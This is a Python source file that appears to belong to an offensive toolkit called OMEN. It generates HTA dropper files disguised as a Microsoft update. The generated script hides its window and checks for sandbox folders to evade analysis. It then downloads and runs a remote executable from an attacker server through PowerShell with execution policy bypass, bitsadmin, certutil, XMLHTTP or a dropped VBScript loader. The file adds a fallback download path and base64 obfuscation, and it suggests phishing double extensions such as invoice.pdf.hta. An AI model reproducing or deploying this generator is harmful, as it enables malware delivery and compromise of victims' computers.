# OMEN - HTA Payload Generator

from . import Generator
import base64
import json


class HtaGenerator(Generator):
    @property
    def name(self):
        return 'HTA Payload'

    @property
    def description(self):
        return 'Generates HTA (HTML Application) payloads with PowerShell, MSHTA, or WScript execution'

    def get_options_schema(self):
        return {
            'payload_url': {
                'type': 'text', 'label': 'Payload URL',
                'default': 'http://YOUR_SERVER/payload.exe',
                'description': 'URL to the payload binary or script',
            },
            'dropper_method': {
                'type': 'select', 'label': 'Dropper Method',
                'options': ['powershell', 'bitsadmin', 'certutil', 'xmlhttp', 'wscript'],
                'default': 'powershell',
            },
            'obfuscate_html': {
                'type': 'checkbox', 'label': 'Obfuscate HTML', 'default': True,
            },
            'sandbox_evasion': {
                'type': 'checkbox', 'label': 'Sandbox Evasion', 'default': True,
            },
            'fallback_chain': {
                'type': 'checkbox', 'label': 'Fallback Chain', 'default': True,
            },
            'icon': {
                'type': 'select', 'label': 'HTA Icon',
                'options': ['default', 'pdf', 'word', 'excel', 'folder', 'update'],
                'default': 'default',
            },
        }

    def generate(self, options, obfuscation='none'):
        url = options.get('payload_url', 'http://YOUR_SERVER/payload.exe')
        method = options.get('dropper_method', 'powershell')
        sandbox = options.get('sandbox_evasion', True)
        fallback = options.get('fallback_chain', True)
        icon = options.get('icon', 'default')

        icon_list = {
            'default': '', 'pdf': 'C:\\Windows\\Installer\\{AC76BA86-...}\\PDF\\PDF.ICO',
            'word': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE,1',
            'excel': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE,1',
            'folder': 'shell32.dll,4', 'update': 'C:\\Windows\\System32\\wuaueng.dll,0',
        }
        ic = icon_list.get(icon, '')

        buf = []
        buf.append('<!DOCTYPE html><html><head>')
        buf.append('<meta http-equiv="Content-Type" content="text/html; charset=utf-8">')
        buf.append('<title>Microsoft Update KB5056424</title>')
        if ic:
            buf.append('<link rel="icon" href="' + ic + '">')
        buf.append('<HTA:APPLICATION ID="Main" APPLICATIONNAME="WindowsUpdate"')
        buf.append('WINDOWSTATE="minimize" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"')
        buf.append('SYSMENU="no" BORDER="none" CAPTION="no">')
        buf.append('<script language="VBScript">')
        buf.append('On Error Resume Next : Self.resizeTo 0,0 : Self.MoveTo -1000,-1000')

        if sandbox:
            buf.append('Dim f : Set f = CreateObject("Scripting.FileSystemObject")')
            buf.append('Dim ap : ap = Array("C:\\tools\\","C:\\Program Files\\Windows Sandbox\\","C:\\Windows\\Temp\\VBox\\","C:\\analysis\\")')
            buf.append('For Each p In ap : If f.FolderExists(p) Then Self.Close : Next')

        buf.append('Sub Main() : On Error Resume Next')

        if method == 'powershell':
            buf.append('Dim sh : Set sh = CreateObject("WScript.Shell")')
            cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -C "&{$wc=New-Object Net.WebClient;$wc.Headers.Add('
            cmd += "'User-Agent','Mozilla/5.0');"
            cmd += '[System.IO.Directory]::SetCurrentDirectory($env:TEMP);'
            cmd += "$wc.DownloadFile('" + url + "','pt.exe');Start-Process 'pt.exe'}\""
            buf.append('Dim ps : ps = ' + json.dumps(cmd))
            buf.append('sh.Run ps, 0, False')
        elif method == 'bitsadmin':
            buf.append('Dim sh : Set sh = CreateObject("WScript.Shell")')
            buf.append('sh.Run "bitsadmin /transfer up /download /priority high ' + url + ' %TEMP%\\updt.exe", 0, False')
            buf.append('sh.Run "%TEMP%\\updt.exe", 0, False')
        elif method == 'certutil':
            buf.append('Dim sh : Set sh = CreateObject("WScript.Shell")')
            buf.append('sh.Run "certutil -urlcache -split -f ' + url + ' %TEMP%\\updt.exe", 0, False')
            buf.append('sh.Run "%TEMP%\\updt.exe", 0, False')
        elif method == 'xmlhttp':
            buf.append('Dim x, s, sh, fs, tf')
            buf.append('Set x = CreateObject("MSXML2.XMLHTTP")')
            buf.append('Set sh = CreateObject("WScript.Shell")')
            buf.append('tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\\updt.exe"')
            buf.append('x.Open "GET", ' + json.dumps(url) + ', False : x.Send')
            buf.append('If x.Status = 200 Then')
            buf.append('Set s = CreateObject("ADODB.Stream")')
            buf.append('s.Open : s.Type = 1 : s.Write x.ResponseBody')
            buf.append('s.SaveToFile tf, 2 : s.Close')
            buf.append('sh.Run tf, 0, False')
            buf.append('End If')
        elif method == 'wscript':
            buf.append('Dim sh, fs, sc, sp, f')
            buf.append('Set sh = CreateObject("WScript.Shell")')
            buf.append('Set fs = CreateObject("Scripting.FileSystemObject")')
            vbs_content = 'Dim x:Set x=CreateObject("MSXML2.XMLHTTP"):x.Open "GET","' + url + '",False:x.Send:Dim s:Set s=CreateObject("ADODB.Stream"):s.Open:s.Type=1:s.Write x.ResponseBody:s.SaveToFile "%TEMP%\\updt.exe",2:CreateObject("WScript.Shell").Run "%TEMP%\\updt.exe",0,False'
            buf.append('sc = ' + json.dumps(vbs_content))
            buf.append('sp = sh.ExpandEnvironmentStrings("%TEMP%") & "\\ldr.vbs"')
            buf.append('Set f = fs.CreateTextFile(sp, True) : f.Write sc : f.Close')
            buf.append('sh.Run "wscript.exe """ & sp & """", 0, False')

        if fallback:
            buf.append("' Fallback method")
            buf.append('Dim fb_sh : Set fb_sh = CreateObject("WScript.Shell")')
            fb_cmd = 'powershell -NoP -W Hidden -C "&{$wc=New-Object Net.WebClient;$wc.DownloadFile('
            fb_cmd += "'" + url + "','$env:TEMP\\updt.exe');Start-Process '$env:TEMP\\updt.exe'}\""
            buf.append('fb_sh.Run ' + json.dumps(fb_cmd) + ', 0, False')

        buf.append('End Sub')
        buf.append('Call Main')
        buf.append('</script></head><body><p>Loading update...</p></body></html>')

        hta = '\n'.join(buf)

        if options.get('obfuscate_html', True) or obfuscation != 'none':
            hta = self._obfuscate_hta(hta, obfuscation)

        return {
            'filename': 'payload.hta',
            'content': hta,
            'preview': hta[:2000] + ('\n... [truncated]' if len(hta) > 2000 else ''),
            'mime': 'application/hta',
            'warnings': ['HTA files may be blocked by modern email gateways',
                         'Consider double extension (e.g., invoice.pdf.hta)'],
            'analysis': {'method': method, 'line_count': len(hta.split('\n'))},
        }

    def _obfuscate_hta(self, hta, level):
        if level == 'none':
            return hta
        import json
        lines = hta.split('\n')
        out = []
        in_script = False
        scr = []
        for line in lines:
            if '<script language="VBScript">' in line:
                in_script = True
                out.append(line)
                continue
            if '</script>' in line and in_script:
                clean = '\n'.join(scr)
                encoded = base64.b64encode(clean.encode('utf-16-le')).decode()
                out.append('Execute(StrConv(CreateObject("MSXML2.DOMDocument").createElement("a").Text, vbUnicode))')
                out.append('Function StrConv(d, c): With CreateObject("MSXML2.DOMDocument").createElement("b"): .DataType = "bin.base64": .Text = d: Set c = .NodeTypedValue: End With: End Function')
                out.append('Call Execute(StrConv(' + json.dumps(encoded) + ', 0))')
                out.append(line)
                in_script = False
                scr = []
                continue
            if in_script:
                scr.append(line)
            else:
                out.append(line)
        return '\n'.join(out)
